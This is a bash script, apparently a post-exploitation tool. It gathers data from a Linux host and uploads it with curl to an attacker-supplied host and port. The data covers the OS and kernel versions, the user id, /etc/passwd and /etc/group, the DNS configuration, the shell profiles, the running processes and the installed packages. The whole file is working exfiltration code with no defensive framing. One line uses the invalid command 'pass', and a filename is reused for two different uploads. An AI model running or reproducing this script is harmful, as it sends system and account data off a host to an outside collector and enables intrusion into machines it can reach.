#!/bin/bash
set -x

while getopts ':h:p:' OPTION; 
do
    case $OPTION in
        h)
            host=$OPTARG
            ;;
        p)
            port=$OPTARG
            ;;
    esac
done
# shift $((OPTIND - 1))

# function for getting enviroment variables
function bash_info(){
    cat /etc/profile
    cat /etc/bashrc
    cat ~/.bash_profile
    cat ~/.bashrc
}

function running_process(){
    ps -ef
    ps faux
}

# Get host version information
curl -X POST http://$host:$port/text/ -F "filename=os_info.txt" -F "text=$(cat /etc/*-release)"

# Get the kernel
curl -X POST http://$host:$port/text/ -F "filename=kernel.txt" -F "text=$(uname -a)"

# Get the user ID currently logged in as
curl -X POST http://$host:$port/text/ -F "filename=id.txt" -F "text=$(id)"

# Get passwd and group files
curl -X POST http://$host:$port/text/ -F "filename=passwd.txt" -F "text=$(cat /etc/passwd)"
curl -X POST http://$host:$port/text/ -F "filename=groupd.txt" -F "text=$(cat /etc/group)"

# Get dns servers
curl -X POST http://$host:$port/fileupload/ -F 'file=@/etc/resolv.conf' -H "Content-Type: multipart/form-data"

# Gather bash profile info
curl -X POST http://$host:$port/text/ -F "filename=bash_info.txt" -F "text=$(bash_info)"

# Get list of services
curl -X POST http://$host:$port/text/ -F "filename=bash_info.txt" -F "text=$(running_process)"

# Get installed packages
if [ -f /usr/bin/dpkg ]
then 
    curl -X POST http://$host:$port/text/ -F "filename=installed_apps.txt" -F "text=$(dpkg -l)"
elif [ -f /usr/bin/rpm ]
then
    curl -X POST http://$host:$port/text/ -F "filename=installed_apps.txt" -F "text=$(rpm -qa)"
else
    pass
fi

